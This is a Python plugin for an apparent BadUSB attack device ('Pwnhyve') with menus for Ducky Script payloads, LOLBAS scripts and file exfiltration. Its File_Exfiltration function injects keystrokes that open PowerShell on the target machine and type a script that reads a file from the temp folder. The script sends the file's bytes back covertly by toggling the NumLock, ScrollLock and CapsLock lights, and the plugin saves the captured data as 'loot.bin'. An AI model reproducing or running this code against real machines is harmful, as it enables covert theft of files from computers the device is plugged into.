import time
from PIL import ImageFont
from core.badusb.badusb import BadUSB, DuckyScriptInterpreter
from core.badusb.keyreflect import KeyReflectionSocket
import os
from core.plugin import BasePwnhyvePlugin

class vars:

    payloadList = {}

    font = ImageFont.truetype('core/fonts/roboto.ttf', 11)

try:
    usb = BadUSB()
except FileNotFoundError:
    usb = None

class Plugin(BasePwnhyvePlugin):
    _icons = {
        "File_Exfiltration": "./core/icons/usb.bmp",
        "Ducky_Payloads": "./core/icons/usbfolder.bmp",
        "LOLBAS": "./core/icons/usbfolder.bmp"
    }

    def File_Exfiltration(tpil):
        global usb

        if usb == None:
            a = tpil.gui.screenConsole()

            a.setText("USB is not connected\n\n...")

            tpil.waitForKey()

            a.exit()

            return

        handler = tpil.gui.screenConsole() # init handler

        handler.addText("hit any key to execute\nexfiltrating: %tmp%/z")

        tpil.waitForKey(debounce=True)

        kr = KeyReflectionSocket(createUSB=usb)

        usb.run("powershell")
        time.sleep(1.25)
        usb.write("""Add-Type -AssemblyName System.Windows.Forms
$o='';$n=$false;$s=$false;$c=$false
gc "$env:TEMP\z" -enc byte|%{
$b=[convert]::ToString($_,2).PadLeft(8,'0')
for($i=0;$i-lt8;$i+=2){
 $nb=($b[$i]-eq'1');if($n-ne$nb){$o+='{NUMLOCK}';$n=!$n}
 $sb=($b[$i+1]-eq'1');if($s-ne$sb){$o+='{SCROLLLOCK}';$s=!$s}
 $o+='{CAPSLOCK}{CAPSLOCK}';$c=!$c
}};[System.Windows.Forms.SendKeys]::SendWait($o)""")
        
        usb.press("ENTER")
            
        while True:
            handler.addText("recieved: {} bytes".format(len(kr.byteBuffer)))
            
            if len(kr.recvBuffer) > 0 and len(kr.byteBuffer) == 0:
                handler.addText("done")
                break

            time.sleep(0.5)

        with open("loot.bin", "wb") as f:
            f.write(kr.recv())
            f.flush()

        tpil.waitForKey()
        handler.exit()

    def Ducky_Payloads(tpil):
        global usb
        # args: [draw, disp, image]

        if usb == None:
            a = tpil.gui.screenConsole()

            a.setText("USB is not connected\n\n...")

            tpil.waitForKey()

            a.exit()

            return

        print("abcd")

        payloads = os.listdir("./addons/payloads/")

        vars.payloadList["back"] = '0'

        time.sleep(0.5)

        a = tpil.gui.menu(payloads)

        if a == "back":
            return

        if a == None:
            return

        dsi = DuckyScriptInterpreter(usb, "./addons/payloads/{}".format(a), tpil)

        dsi.parse()

        dsi.handler.addText("press any key..")
        dsi.handler.exit()

        tpil.waitForKey()

    def LOLBAS(tpil):

        basedir = "./core/LOLBAS/"
        directory = basedir

        if usb == None:
            a = tpil.gui.screenConsole()

            a.setText("USB is not connected\n\n...")

            tpil.waitForKey()

            a.exit()

            return

        while True:
            # theres definitely a better way of doin this
            ####

            folder = tpil.gui.menu([x if os.path.isdir(x) else "" for x in os.listdir("./core/LOLBAS")])

            if folder == None: return

            directory += folder

            ###

            script = tpil.menu([x.replace(".txt", "") for x in os.listdir(directory)])

            if script == None: directory = basedir; continue

            directory += script

            break

            ###

        dsi = DuckyScriptInterpreter(usb, directory,
                                      tpil)

        dsi.parse()

        dsi.handler.addText("press any key..")
        dsi.handler.exit()

        tpil.waitForKey()